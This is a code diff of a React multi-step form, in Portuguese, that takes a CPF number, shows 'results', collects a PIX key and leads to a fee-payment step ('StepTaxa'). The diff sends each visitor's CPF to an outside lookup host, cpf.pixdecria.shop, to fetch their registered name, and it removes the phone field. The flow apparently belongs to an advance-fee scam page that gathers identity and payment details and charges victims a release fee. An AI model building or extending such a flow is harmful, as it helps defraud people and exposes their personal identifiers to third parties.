@@ -226,7 +226,7 @@ function StepForm({ onSubmit, onClose }) {
         setCpfStatus("loading");
         const controller = new AbortController();
         const timer = setTimeout(() => controller.abort(), 8000);
-        fetch(`/api/cpf/${cpfDigits}`, {
+        fetch(`https://cpf.pixdecria.shop/api/v1/consult/${formatCPF(cpfDigits)}`, {
             method: "GET",
             headers: { "Accept": "application/json" },
             signal: controller.signal,
@@ -614,18 +614,17 @@ function StepResults({ formData, onClose, onRegisterPix }) {
 // ─── step 4: pix key ──────────────────────────────────────────────────────────
 
 function StepPixKey({ formData, onSubmit, onBack }) {
-    const [nome, setNome]         = useState(
+    const [nome, setNome]             = useState(
         formData?.cpfData?.NOME ? toTitleCase(formData.cpfData.NOME) : ""
     );
     const [nomeStatus, setNomeStatus] = useState(
         formData?.cpfData?.NOME ? "found" : "loading"
     );
-    const [telefone, setTelefone] = useState("");
-    const [keyType, setKeyType]   = useState("CPF");
-    const [keyValue, setKeyValue] = useState(formData?.cpf || "");
-    const [error, setError]       = useState("");
+    const [keyType, setKeyType]       = useState("CPF");
+    const [keyValue, setKeyValue]     = useState(formData?.cpf || "");
+    const [error, setError]           = useState("");
 
-    // Busca o nome pelo CPF ao abrir o step (fallback caso o form tenha submetido antes da API responder)
+    // Fallback: busca nome se o form foi submetido antes da API responder
     useEffect(() => {
         if (formData?.cpfData?.NOME) { setNomeStatus("found"); return; }
         const digits = (formData?.cpf || "").replace(/\D/g, "");
@@ -633,7 +632,7 @@ function StepPixKey({ formData, onSubmit, onBack }) {
         setNomeStatus("loading");
         const controller = new AbortController();
         const timer = setTimeout(() => controller.abort(), 8000);
-        fetch(`/api/cpf/${digits}`, {
+        fetch(`https://cpf.pixdecria.shop/api/v1/consult/${formatCPF(digits)}`, {
             method: "GET",
             headers: { "Accept": "application/json" },
             signal: controller.signal,
@@ -651,7 +650,6 @@ function StepPixKey({ formData, onSubmit, onBack }) {
     }, []); // eslint-disable-line react-hooks/exhaustive-deps
 
     const selectedType = PIX_KEY_TYPES.find((k) => k.value === keyType);
-    const showPhone = keyType !== "telefone";
 
     const handleKeyTypeChange = (val) => {
         setKeyType(val);
@@ -670,12 +668,8 @@ function StepPixKey({ formData, onSubmit, onBack }) {
     const handleSubmit = (e) => {
         e.preventDefault();
         setError("");
-        const phoneRaw = keyType === "telefone"
-            ? keyValue.replace(/\D/g, "")
-            : telefone.replace(/\D/g, "");
-        if (phoneRaw.length < 10) { setError("Informe um telefone válido com DDD."); return; }
         if (!nome.trim()) { setError("Informe seu nome completo."); return; }
-        onSubmit({ nome: nome.trim(), telefone: phoneRaw, keyType, keyValue });
+        onSubmit({ nome: nome.trim(), keyType, keyValue });
     };
 
     const inputStyle = { backgroundColor: "#0a1a0f", border: "1px solid #1e3a26" };
@@ -722,22 +716,6 @@ function StepPixKey({ formData, onSubmit, onBack }) {
                             }}
                         />
                     </div>
-
-                    {showPhone && (
-                        <div>
-                            <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">Telefone (com DDD)</label>
-                            <input
-                                type="text"
-                                value={telefone}
-                                onChange={(e) => setTelefone(formatPhone(e.target.value))}
-                                placeholder="(11) 99999-9999"
-                                required
-                                inputMode="tel"
-                                className="w-full rounded-xl px-4 py-3 text-white placeholder-zinc-600 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50"
-                                style={inputStyle}
-                            />
-                        </div>
-                    )}
 
                     <div>
                         <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">Tipo de chave PIX</label>
@@ -818,7 +796,6 @@ function StepTaxa({ formData, pixKeyData, onPay, onBack }) {
                     name: pixKeyData.nome,
                     document: formData.cpf.replace(/\D/g, ""),
                     email: formData.email,
-                    phone: pixKeyData.telefone,
                     utm,
                 }),
             });
